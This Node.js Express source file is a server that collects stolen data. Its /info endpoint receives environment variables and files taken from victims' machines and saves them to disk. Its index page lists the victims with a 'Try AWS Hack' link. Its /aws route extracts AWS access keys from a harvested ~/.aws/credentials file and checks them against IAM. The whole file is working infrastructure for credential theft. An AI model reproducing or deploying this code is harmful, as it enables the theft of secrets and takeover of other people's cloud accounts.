var express = require('express');
var app = express();
var bodyParser = require('body-parser');
var _ = require('lodash');
var crypto = require('crypto');
var AWS = require('aws-sdk');
var fs = require('fs');
var storage = {};

app.use(bodyParser.json());

function md5(str) {
  return crypto.createHash('md5').update(str).digest('hex');
}

function safeCreateFolder(path, callback) {
  fs.lstat(path, function(err, stats) {
    if (err || !stats.isDirectory()) {
      fs.mkdir(path, callback);
    }
  });
}

function sanitiseFilename(filename) {
  var lastIndex = filename.lastIndexOf('/');
  if (lastIndex > -1) {
    filename = filename.substr(lastIndex+1);
  }
  return filename;
}

function writeFile(dirname, filename, contents) {
  var fs = require('fs');
  fs.writeFile(dirname + '/' + sanitiseFilename(filename), contents, function(err) {
    if(err) {
      console.log(err);
    }
  });
}

function storeData(data) {
  var hash = md5(JSON.stringify(data));
  storage[hash] = data;
  var dirname = '../hackery-data/' + hash;
  safeCreateFolder(dirname, function (err) {
    if (err) console.log(err);
    writeFile(dirname, 'env.txt', _.map(storage.envVars, function (value, key) {
      return key + ' = ' + value;
    }).join('\n'));
    _.each(storage.files, function (content, name) {
      writeFile(dirname, name, content);
    });
  });
}

function processAwsCreds(fileContent) {
  function getFirst(reg) {
    var matched = fileContent.match(reg);
    return matched && matched[1];
  }
  return {
    accessKeyId: getFirst(/aws_access_key_id\s*=\s*([A-Z0-9]+)/),
    secretAccessKey: getFirst(/aws_secret_access_key\s*=\s*([A-Za-z0-9\/]+)/)
  }
}

safeCreateFolder('../hackery-data');

app.get('/', function (req, res) {
  var prepped = _.map(storage, function(d, k) {
    return {
      user: d.envVars.USER,
      id: k,
      files: _.map(d.files, function (d, k) { return k; }),
      envVarCount: _.keys(d.envVars).length
    }
  });
  res.send(_.map(prepped, function (item) {
    return '<article>'
        + '<h1>' + item.user + '</h1>'
        + '<p>' + item.envVarCount + ' environment variables</p>'
        + '<p><a href="/aws/' + item.id + '">Try AWS Hack</a></p>'
        + '<h4>Files</h4>'
        + '<ul><li>' + item.files.join('</li><li>') + '</li></ul>'
        '</article>'
  }).join(''));
});

app.get('/aws/:id', function (req, res) {
  var id = req.param('id');
  var fileContents = storage[id];
  fileContents = fileContents && fileContents.files;
  fileContents = fileContents && fileContents['~/.aws/credentials'];
  if (fileContents) {
    var creds = processAwsCreds(fileContents);
    var iam = new AWS.IAM(creds);
    iam.getUser(function (err, data) {
      if (err) {
        console.log(err);
        res.send('Access Key is ' + creds.accessKeyId + ', secret key ends in ' + creds.secretAccessKey.substr(-4));
      } else {
        res.send(data);
      }
    });
  } else {
    res.status(404).send('no AWS creds found');
  }
});

app.post('/info', function (req, res) {
  storeData(req.body);
  console.log('Scraped data for ' + req.body.envVars.USER);
  res.send('Thanks.');
});

var port = process.env.PORT || 3000;
app.listen(port);
console.log('started on port ', port);